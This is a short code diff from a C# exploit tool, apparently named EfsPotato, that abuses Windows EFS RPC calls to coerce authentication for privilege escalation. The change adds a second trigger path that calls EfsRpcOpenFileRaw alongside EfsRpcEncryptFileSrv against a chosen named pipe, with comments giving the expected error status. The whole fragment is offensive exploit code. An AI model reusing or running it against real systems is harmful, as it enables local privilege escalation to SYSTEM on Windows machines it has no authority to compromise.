@@ -234,11 +234,28 @@ namespace EfsPotato.Library
 
                 if (hBinding != IntPtr.Zero)
                 {
-                    Console.WriteLine("[>] Calling EfsRpcEncryptFileSrv().");
-                    Console.WriteLine("    [*] Target File Path   : {0}", filePath.ToString());
-                    Console.WriteLine("    [*] Endpoint Pipe Name : \\pipe\\{0}", Globals.EndpointPipeName);
+                    if (Globals.RpcProcOpt == RPC_PROC_OPTIONS.EfsRpcEncryptFileSrv)
+                    {
+                        Console.WriteLine("[>] Calling EfsRpcEncryptFileSrv().");
+                        Console.WriteLine("    [*] Target File Path   : {0}", filePath.ToString());
+                        Console.WriteLine("    [*] Endpoint Pipe Name : \\pipe\\{0}", Globals.EndpointPipeName);
 
-                    rpcStatus = rpc.EfsRpcEncryptFileSrv(hBinding, filePath);
+                        // Expected RPC_STATUS is 0x00000035 (ERROR_BAD_NETPATH)
+                        rpcStatus = rpc.EfsRpcEncryptFileSrv(hBinding, filePath);
+                    }
+                    else
+                    {
+                        Console.WriteLine("[>] Calling EfsRpcOpenFileRaw().");
+                        Console.WriteLine("    [*] Target File Path   : {0}", filePath.ToString());
+                        Console.WriteLine("    [*] Endpoint Pipe Name : \\pipe\\{0}", Globals.EndpointPipeName);
+
+                        // Expected RPC_STATUS is 0x00000035 (ERROR_BAD_NETPATH)
+                        rpcStatus = rpc.EfsRpcOpenFileRaw(hBinding, out IntPtr hContext, filePath, 0);
+
+                        if (hContext != IntPtr.Zero)
+                            rpc.EfsRpcCloseRaw(ref hContext);
+                    }
+
                     RpcHelpers.CloseBindingHandle(ref hBinding);
                 }
                 else
